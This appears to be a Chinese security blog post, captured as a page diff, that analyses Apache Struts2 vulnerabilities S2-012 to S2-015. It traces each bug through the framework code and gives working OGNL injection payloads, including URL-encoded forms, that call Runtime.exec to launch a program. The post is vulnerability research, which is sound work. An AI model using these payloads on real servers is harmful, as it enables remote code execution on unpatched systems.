@@ -1,0 +1,1203 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xzq1_64x64.png">
+  <link rel="icon" href="/img/xzq1_64x64.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lingx5">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="S2-012影响版本：Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2  参考链接：https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-012 这与 S2-001 很相似，在设置了结果重定向，Struts2 使用 StrutsResultSupport 的子类 ServletRedi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="struts2反序列化12-61">
+<meta property="og:url" content="http://lingx5.github.io/2025/04/10/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9612-61/index.html">
+<meta property="og:site_name" content="lingx5的博客">
+<meta property="og:description" content="S2-012影响版本：Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2  参考链接：https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-012 这与 S2-001 很相似，在设置了结果重定向，Struts2 使用 StrutsResultSupport 的子类 ServletRedi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-04-10_19-04-48.gif">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410191420093.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410191551363.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410192023432.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410192202409.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410194534766.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410200247524.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410200316465.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410202343567.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250410212627921.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250411093317878.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250411093426145.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250411093701762.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250411100136738.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250411100400080.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250411101315385.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250411102155084.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250411103903928.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250411104246518.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250411111021332.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250411111036753.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412211502638.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412101748318.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412110620680.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412111005761.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412111523030.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412142002323.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412152958382.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412153207376.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412164216799.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412164622939.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412170755264.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412170620040.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412185934861.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412190827855.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412191657068.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412192551013.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412193151390.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412205245232.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412214729940.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412214753022.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250412215151649.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413130240401.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413130724051.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413132456568.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413132523350.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413133011869.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413133456501.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413142038871.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413144231784.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413171908430.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413172103948.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413142002636.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413172406781.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413172622525.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250413184620091.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414100846761.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414100626286.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414101018351.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414101204372.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414105820120.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414110037624.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414110342149.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414110610432.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414110646630.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414110918614.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414183841950.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414184327167.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414184404074.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414185459815.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250414185638662.png">
+<meta property="article:published_time" content="2025-04-10T10:14:55.000Z">
+<meta property="article:modified_time" content="2025-04-14T11:47:42.373Z">
+<meta property="article:author" content="lingx5">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="Struts2">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-04-10_19-04-48.gif">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>struts2反序列化12-61 - lingx5的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"lingx5.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Q4th1PtYC02FHNKGV3QVJgNX-MdYXbMMI","app_key":"Y9vGCfdqm9u55ZBjM8ep8KDX","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-3-23","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lingx5的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="struts2反序列化12-61"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-10 18:14" pubdate>
+          2025年4月10日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          41 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Struts2"
+        id="heading-1bd159e8211d832bf81516263bc2d496" role="tab" data-toggle="collapse" href="#collapse-1bd159e8211d832bf81516263bc2d496"
+        aria-expanded="true"
+      >
+        Struts2
+        <span class="list-group-count">(2)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-1bd159e8211d832bf81516263bc2d496"
+           role="tabpanel" aria-labelledby="heading-1bd159e8211d832bf81516263bc2d496">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2025/04/10/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961-9/" title="struts2漏洞1-9"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">struts2漏洞1-9</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/04/10/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9612-61/" title="struts2反序列化12-61"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">struts2反序列化12-61</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">struts2反序列化12-61</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <meta name="referrer" content="no-referrer" />
+
+<h2 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h2><p>影响版本：Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2 </p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-012">https://cwiki.apache.org/confluence/display/WW/S2-012</a></p>
+<p>这与 S2-001 很相似，在设置了结果重定向，Struts2 使用 StrutsResultSupport 的子类 ServletRedirectResult 类处理 redirect 结果，会造成二次解析</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;redirect&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;redirect&quot;</span>&gt;</span>/index.jsp?name=$&#123;name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><img src="https://gitee.com/ling-x5/img/raw/master/PixPin_2025-04-10_19-04-48.gif" srcset="/img/loading.gif" lazyload alt="PixPin_2025-04-10_19-04-48" style="zoom:50%;" />
+
+<p>重定向会来到 org.apache.struts2.dispatcher.ServletRedirectResult#execute</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410191420093.png" srcset="/img/loading.gif" lazyload alt="image-20250410191420093"></p>
+<p>父类的 execute 方法，里面调用了 conditionalParse 进而调用了 translateVariables</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410191551363.png" srcset="/img/loading.gif" lazyload alt="image-20250410191551363"></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410192023432.png" srcset="/img/loading.gif" lazyload alt="image-20250410192023432"></p>
+<p>后续就和 S2-001 的步骤一样了，循环解析 ognl 表达式</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">translateVariables:<span class="hljs-number">198</span>, TextParseUtil (com<span class="hljs-selector-class">.opensymphony</span><span class="hljs-selector-class">.xwork2</span>.util)<br>translateVariables:<span class="hljs-number">129</span>, TextParseUtil (com<span class="hljs-selector-class">.opensymphony</span><span class="hljs-selector-class">.xwork2</span>.util)<br>translateVariables:<span class="hljs-number">73</span>, TextParseUtil (com<span class="hljs-selector-class">.opensymphony</span><span class="hljs-selector-class">.xwork2</span>.util)<br>conditionalParse:<span class="hljs-number">198</span>, StrutsResultSupport (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>execute:<span class="hljs-number">185</span>, StrutsResultSupport (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br>execute:<span class="hljs-number">158</span>, ServletRedirectResult (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.dispatcher)<br></code></pre></td></tr></table></figure>
+
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs d">%&#123;#_memberAccess[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="hljs-literal">true</span>,<span class="hljs-keyword">@java</span>.lang.Runtime<span class="hljs-keyword">@getRuntime</span>().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410192202409.png" srcset="/img/loading.gif" lazyload alt="image-20250410192202409"></p>
+<h2 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.14.1 </p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-013">https://cwiki.apache.org/confluence/display/WW/S2-013</a></p>
+<p>与 S2-002 的 xss 很相似，不过当时忽略了，这其实是可以解析 ognl 执行命令的</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;s:url <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attribute">action</span>=<span class="hljs-string">&quot;HelloWorld&quot;</span> <span class="hljs-attribute">includeParams</span>=<span class="hljs-string">&quot;all&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>当配置 <code>includeParams=&quot;all&quot;</code> 时，会接受所有的 get 和 post 参数，进行解析</p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>官方给出的 POC</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">HelloWorld.action?fakeParam=%25%7B(%23_memberAccess%5B<span class="hljs-string">&#x27;allowStaticMethodAccess&#x27;</span>%5D%3Dtrue)(%23context%5B<span class="hljs-string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>%5D%3Dfalse)(%23writer%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23writer.println(<span class="hljs-string">&#x27;hacked&#x27;</span>)%2C%23writer.close())%7D<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410194534766.png" srcset="/img/loading.gif" lazyload alt="image-20250410194534766"></p>
+<p>当然肯定也是可以实现命令执行的</p>
+<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs d">fakeParam=%&#123;#_memberAccess[<span class="hljs-string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="hljs-literal">true</span>,<span class="hljs-keyword">@java</span>.lang.Runtime<span class="hljs-keyword">@getRuntime</span>().exec(<span class="hljs-string">&quot;calc&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>
+
+<p>url 编码后</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">fakeParam<span class="hljs-operator">=</span><span class="hljs-variable">%25</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%5</span>b<span class="hljs-variable">%22</span>allowStaticMethodAccess<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%3</span>dtrue<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%40</span>java.lang.Runtime<span class="hljs-variable">%40</span>getRuntime().exec(<span class="hljs-variable">%22</span>calc<span class="hljs-variable">%22</span>)<span class="hljs-variable">%7</span>d<br></code></pre></td></tr></table></figure>
+
+<p>我们在 doStartTag 打断点，分析一下 ，前边调试基本与 S2-002 一致</p>
+<p>在调用 doStartTag 的时候，处理 includeParam &#x3D; all 时，调用到 <code>ServletUrlRenderer#includeGetParameters</code> 进而调用了 <code>UrlHelper#parseQueryString</code> </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410200247524.png" srcset="/img/loading.gif" lazyload alt="image-20250410200247524"></p>
+<p>调用栈</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">parseQueryString:<span class="hljs-number">328</span>, UrlHelper (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.views</span>.util)<br>parseQueryString:<span class="hljs-number">308</span>, UrlHelper (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.views</span>.util)<br>includeGetParameters:<span class="hljs-number">265</span>, ServletUrlRenderer (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.components)<br>beforeRenderUrl:<span class="hljs-number">243</span>, ServletUrlRenderer (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.components)<br>start:<span class="hljs-number">144</span>, URL (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span>.components)<br>doStartTag:<span class="hljs-number">53</span>, ComponentTagSupport (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.struts2</span><span class="hljs-selector-class">.views</span>.jsp)<br></code></pre></td></tr></table></figure>
+
+<p>看到调用 translateAndDecode  跟进去就是在调用 translateVariable </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410200316465.png" srcset="/img/loading.gif" lazyload alt="image-20250410200316465"></p>
+<p>后续同样，跟 S2-001 一样了</p>
+<h2 id="S2-014"><a href="#S2-014" class="headerlink" title="S2-014"></a>S2-014</h2><p>影响版本： Struts 2.0.0 - Struts 2.3.14.1</p>
+<p>参考链接： <a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-014">https://cwiki.apache.org/confluence/display/WW/S2-014</a></p>
+<p>其实就是对 S2-013 的另一种 payload 攻击</p>
+<p>因为在 translateVariable 的解析中，会解析 <code>%</code> 和 <code>$</code> 两种开头标识</p>
+<p>这里官方也给出了对应的 payload</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">HelloWorld.action?aaa=<span class="hljs-number">1</span>$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Runtime@getRuntime().<span class="hljs-keyword">exec</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure>
+
+<p>url 编码后</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HelloWorld</span>.action?aaa=<span class="hljs-number">1</span>%<span class="hljs-number">24</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">23</span>_memberAccess%<span class="hljs-number">5</span>b%<span class="hljs-number">22</span>allowStaticMethodAccess%<span class="hljs-number">22</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">3</span>dtrue%<span class="hljs-number">2</span>c%<span class="hljs-number">40</span>java.lang.Runtime%<span class="hljs-number">40</span>getRuntime().exec(%<span class="hljs-number">22</span>calc%<span class="hljs-number">22</span>)%<span class="hljs-number">7</span>d<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250410202343567.png" srcset="/img/loading.gif" lazyload alt="image-20250410202343567"></p>
+<h2 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h2><p>影响版本：Struts 2.0.0 - Struts 2.3.14.2 </p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-015">https://cwiki.apache.org/confluence/display/WW/S2-015</a> </p>
+<p>Struts 2 允许基于通配符定义动作映射，如下例所示：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;*&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;example.ExampleSupport&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/example/&#123;1&#125;.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>当 Struts 2 找不到 action 时，就会去匹配通配符 <code>*</code> 并解析，用 <code>&#123;1&#125;</code> 当作 ognl 表达式来解析并获取值</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>官方给出的 POC</p>
+<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk"><span class="hljs-string">$&#123;</span><span class="hljs-symbol">#foo</span>=<span class="hljs-string">&#x27;Menu&#x27;</span>,<span class="hljs-symbol">#foo</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>url 编码后</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%24</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%23</span>foo<span class="hljs-variable">%3</span>d<span class="hljs-variable">%27</span>Menu<span class="hljs-variable">%27</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>foo<span class="hljs-variable">%7</span>d<br></code></pre></td></tr></table></figure>
+
+<p>可以看到的确解析了我们 ognl 表达式，去寻找 Menu.jsp 文件</p>
